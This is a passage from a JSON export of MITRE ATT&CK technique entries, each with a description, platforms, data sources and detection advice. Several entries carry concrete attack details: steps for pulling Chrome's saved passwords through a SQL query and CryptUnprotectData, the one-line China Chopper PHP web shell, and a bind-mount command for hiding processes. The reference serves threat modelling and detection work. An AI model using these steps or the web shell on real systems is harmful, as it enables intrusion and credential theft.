discover the requirements to access them. Unlike in [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526), this technique focuses on the discovery of components of the provided services rather than the services themselves.",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1580",
      "stix_id": "attack-pattern--57a3d31a-d04f-4663-b2da-7df8ec3f8c9d",
      "created": "2020-08-20T17:51:25.671000+00:00",
      "modified": "2025-04-15T22:02:30.057000+00:00",
      "platforms": [
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Instance: Instance Enumeration",
        "Cloud Storage: Cloud Storage Enumeration",
        "Volume: Volume Enumeration",
        "Snapshot: Snapshot Enumeration"
      ],
      "defense_bypassed": [],
      "detection": "Establish centralized logging for the activity of cloud infrastructure components. Monitor logs for actions that could be taken to gather information about cloud infrastructure, including the use of discovery API calls by new or unexpected users and enumerations from unknown or malicious IP addresses. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones."
    },
    "T1555.003": {
      "id": "T1555.003",
      "name": "Credentials from Web Browsers",
      "description": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim\u2019s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018)\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1555.003",
      "stix_id": "attack-pattern--58a3e6aa-4453-4cc8-a51f-4befe80b31a8",
      "created": "2020-02-12T18:57:36.041000+00:00",
      "modified": "2025-04-15T22:12:28.087000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Access",
        "File: File Access",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Identify web browser files that contain credentials such as Google Chrome\u2019s Login Data database file: <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code>. Monitor file read events of web browser files that contain credentials, especially when the reading process is unrelated to the subject web browser. Monitor process execution logs to include PowerShell Transcription focusing on those that perform a combination of behaviors including reading web browser process memory, utilizing regular expressions, and those that contain numerous keywords for common web applications (Gmail, Twitter, Office365, etc.)."
    },
    "T1574.008": {
      "id": "T1574.008",
      "name": "Path Interception by Search Order Hijacking",
      "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\n\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking, the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL](https://attack.mitre.org/techniques/T1574/001).",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1574.008",
      "stix_id": "attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2",
      "created": "2020-03-13T17:48:58.999000+00:00",
      "modified": "2025-04-15T19:58:33.873000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "File: File Modification",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n"
    },
    "T1491": {
      "id": "T1491",
      "name": "Defacement",
      "description": "Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for [Defacement](https://attack.mitre.org/techniques/T1491) include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of [Defacement](https://attack.mitre.org/techniques/T1491) in order to cause user discomfort, or to pressure compliance with accompanying messages. \n",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1491",
      "stix_id": "attack-pattern--5909f20f-3c39-4795-be06-ef1ea40d350b",
      "created": "2019-04-08T17:51:41.390000+00:00",
      "modified": "2025-04-25T15:15:35.374000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "File: File Creation",
        "Application Log: Application Log Content",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor internal and external websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.\n\n"
    },
    "T1535": {
      "id": "T1535",
      "name": "Unused/Unsupported Cloud Regions",
      "description": "Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.\n\nCloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.\n\nA variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.\n\nAn example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost organizations substantial amounts of money over time depending on the processing power used.(Citation: CloudSploit - Unused AWS Regions)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1535",
      "stix_id": "attack-pattern--59bd0dec-f8b2-4b9a-9141-37a1e6899761",
      "created": "2019-09-04T14:35:04.617000+00:00",
      "modified": "2025-04-15T23:17:42.649000+00:00",
      "platforms": [
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Instance: Instance Creation",
        "Instance: Instance Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Monitor system logs to review activities occurring across all cloud environments and regions. Configure alerting to notify of activity in normally unused regions or if the number of instances active in a region goes above a certain threshold.(Citation: CloudSploit - Unused AWS Regions)"
    },
    "T1557.003": {
      "id": "T1557.003",
      "name": "DHCP Spoofing",
      "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1557.003",
      "stix_id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
      "created": "2022-03-24T19:30:56.727000+00:00",
      "modified": "2025-04-15T22:13:20.292000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Application Log: Application Log Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Monitor network traffic for suspicious/malicious behavior involving DHCP, such as changes in DNS and/or gateway parameters. Additionally, monitor Windows logs for Event IDs (EIDs) 1341, 1342, 1020 and 1063, which specify that the IP allocations are low or have run out; these EIDs may indicate a denial of service attack.(Citation: dhcp_serv_op_events)(Citation: solution_monitor_dhcp_scopes)"
    },
    "T1563": {
      "id": "T1563",
      "name": "Remote Service Session Hijacking",
      "description": "Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.\n\nAdversaries may commandeer these sessions to carry out actions on remote systems. [Remote Service Session Hijacking](https://attack.mitre.org/techniques/T1563) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it hijacks an existing session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: RDP Hijacking Medium)(Citation: Breach Post-mortem SSH Hijack)",
      "tactic": "lateral-movement",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1563",
      "stix_id": "attack-pattern--5b0ad6f8-6a16-4966-a4ef-d09ea6e2a9f5",
      "created": "2020-02-25T18:26:16.994000+00:00",
      "modified": "2025-04-15T23:00:02.178000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content",
        "Command: Command Execution",
        "Process: Process Creation",
        "Logon Session: Logon Session Creation"
      ],
      "defense_bypassed": [],
      "detection": "Use of these services may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with that service. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.\n\nMonitor for processes and command-line arguments associated with hijacking service sessions."
    },
    "T1564.013": {
      "id": "T1564.013",
      "name": "Bind Mounts",
      "description": "Adversaries may abuse bind mounts on file structures to hide their activity and artifacts from native utilities. A bind mount maps a directory or file from one location on the filesystem to another, similar to a shortcut on Windows. It\u2019s commonly used to provide access to specific files or directories across different environments, such as inside containers or chroot environments, and requires sudo access. \n\nAdversaries may use bind mounts to map either an empty directory or a benign `/proc` directory to a malicious process\u2019s `/proc` directory. Using the commands `mount \u2013o bind /proc/benign-process /proc/malicious-process` (or `mount \u2013B`), the malicious process's `/proc` directory is overlayed with the contents of a benign process's `/proc` directory. When system utilities query process activity, such as `ps` and `top`, the kernel follows the bind mount and presents the benign directory\u2019s contents instead of the malicious process's actual `/proc` directory. As a result, these utilities display information that appears to come from the benign process, effectively hiding the malicious process's metadata, executable, or other artifacts from detection.(Citation: Cado Security Commando Cat 2024)(Citation: Ahn Lab CoinMiner 2023)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1564.013",
      "stix_id": "attack-pattern--5bd41255-a224-4425-a2e2-e9d293eafe1c",
      "created": "2025-01-30T21:01:16.340000+00:00",
      "modified": "2025-04-15T19:58:34.469000+00:00",
      "platforms": [
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Command: Command Execution",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1027.001": {
      "id": "T1027.001",
      "name": "Binary Padding",
      "description": "Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ) ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1027.001",
      "stix_id": "attack-pattern--5bfccc3f-2326-4112-86cc-c1ece9d8a2b5",
      "created": "2020-02-05T14:04:25.865000+00:00",
      "modified": "2025-04-25T14:46:48.991000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool.  When executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information Discovery or Lateral Movement, which could be used as event indicators that point to the source file. "
    },
    "T1505.003": {
      "id": "T1505.003",
      "name": "Web Shell",
      "description": "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1505.003",
      "stix_id": "attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb",
      "created": "2019-12-13T16:46:18.927000+00:00",
      "modified": "2025-04-15T19:58:34.688000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Process: Process Creation",
        "File: File Creation",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013) \n\n<code>&lt;?php @eval($_POST['password']);&gt;</code>\n\nNevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as spawning cmd.exe or accessing files that are not in the Web directory.(Citation: NSA Cyber Mitigating Web Shells)\n\nFile monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script.(Citation: NSA Cyber Mitigating Web Shells)\n\nLog authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells)"
    },
    "T1484.001": {
      "id": "T1484.001",
      "name": "Group Policy Modification",
      "description": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1484.001",
      "stix_id": "attack-pattern--5d2be8b9-d24c-4e98-83bf-2f5f79477163",
      "created": "2020-12-28T21:50:59.844000+00:00",
      "modified": "2025-04-15T19:58:34.774000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Active Directory: Active Directory Object Creation",
        "Active Directory: Active Directory Object Modification",
        "Active Directory: Active Directory Object Deletion"
      ],
      "defense_bypassed": [],
      "detection": "It is possible to detect GPO modifications by monitoring directory service changes using Windows event logs. Several events may be logged for such GPO modifications, including:\n\n* Event ID 5136 - A directory service object was modified\n* Event ID 5137 - A directory service object was created\n* Event ID 5138 - A directory service object was undeleted\n* Event ID 5139 - A directory service object was moved\n* Event ID 5141 - A directory service object was deleted\n\n\nGPO abuse will often be accompanied by some other behavior such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), which will have events associated with it to detect. Subsequent permission value modifications, like those to SeEnableDelegationPrivilege, can also be searched for in events associated with privileges assigned to new logons (Event ID 4672) and assignment of user rights (Event ID 4704)."
    },
    "T1217": {
      "id": "T1217",
      "name": "Browser Information Discovery",
      "description": "Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.(Citation: Kaspersky Autofill)\n\nBrowser information may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001) associated with logins cached by a browser.\n\nSpecific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., `%APPDATA%/Google/Chrome`).(Citation: Chrome Roaming Profiles)",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1217",
      "stix_id": "attack-pattern--5e4a2073-9643-44cb-a0b5-e7f4048446c7",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-15T21:54:16.719000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "File: File Access"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes and command-line arguments for actions that could be taken to gather browser bookmark information. Remote access tools with built-in features may interact directly using APIs to gather information. Information may also be acquired through system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained."
    },
    "T1552.004": {
      "id": "T1552.004",
      "name": "Private Keys",
      "description": "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)\n\nWhen a device is registered to Entra ID, a device key and a transport key are generated and used to verify the device\u2019s identity.(Citation: Microsoft Primary Refresh Token) An adversary with access to the device may be able to export the keys in order to impersonate the device.(Citation: AADInternals Azure AD Device Identities)\n\nOn network devices, private keys may be exported via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `crypto pki export`.(Citation: cisco_deploy_rsa_keys) \n\nSome private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1552.004",
      "stix_id": "attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf",
      "created": "2020-02-04T13:06:49.258000+00:00",
      "modified": "2025-04-15T19:58:35.201000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Access"
      ],
      "defense_bypassed": [],
      "detection": "Monitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication. For network infrastructure devices, collect AAA logging to monitor for private keys being exported."
    },
    "T1583.004": {
      "id": "T1583.004",
      "name": "Server",
      "description": "Adversaries may buy, lease, rent, or obtain physical servers\u00a0that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, such as watering hole operations in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), enabling [Phishing](https://attack.mitre.org/techniques/T1566) operations, or facilitating [Command and Control](https://attack.mitre.org/tactics/TA0011). Instead of compromising a third-party [Server](https://attack.mitre.org/techniques/T1584/004) or renting a [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may opt to configure and run their own servers in support of operations. Free trial periods of cloud servers may also be abused.(Citation: Free Trial PurpleUrchin)(Citation: Freejacked) \n\nAdversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.(Citation: NYTStuxnet)",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1583.004",
      "stix_id": "attack-pattern--60c4b628-4807-4b0b-bbf5-fdac8643c337",
      "created": "2020-10-01T00:48:09.578000+00:00",
      "modified": "2025-04-15T23:05:58.721000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Metadata",
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": "Once adversaries have provisioned a server (ex: for use as a command and control server), internet scans may reveal servers that adversaries have acquired. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
    },
    "T1021.006": {
      "id": "T1021.006",
      "name": "Windows Remote Management",
      "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.\n\nWinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014) WinRM  can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation: MSDN WMI)",
      "tactic": "lateral-movement",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1021.006",
      "stix_id": "attack-pattern--60d0c01d-e2bf-49dd-a453-f8a9c9fa6f65",
      "created": "2020-02-11T18:29:47.757000+00:00",
      "modified": "2025-04-15T23:22:03.699000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Logon Session: Logon Session Creation",
        "Network Traffic: Network Connection Creation",
        "Command: Command Execution",
        "Network Traffic: Network Traffic Flow",
        "Service: Service Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Monitor use of WinRM within an environment by tracking service execution. If it is not normally used or is disabled, then this may be an indicator of suspicious behavior.  Monitor processes created and actions taken by the WinRM process or a WinRM invoked script to correlate it with other related events.(Citation: Medium Detecting Lateral Movement) Also monitor for remote WMI connection attempts (typically over port 5985 when using HTTP and 5986 for HTTPS)."
    },
    "T1011.001": {
      "id": "T1011.001",
      "name": "Exfiltration Over Bluetooth",
      "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
      "tactic": "exfiltration",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1011.001",
      "stix_id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
      "created": "2020-03-09T17:07:57.392000+00:00",
      "modified": "2025-04-15T19:58:35.466000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Command: Command Execution",
        "File: File Access",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a web browser opening with a mouse click or key press) but access the network without such may be malicious.\n\nMonitor for and investigate changes to host adapter settings, such as addition and/or replication of communication interfaces."
    },
    "T1078.001": {
      "id": "T1078.001",
      "name": "Default Accounts",
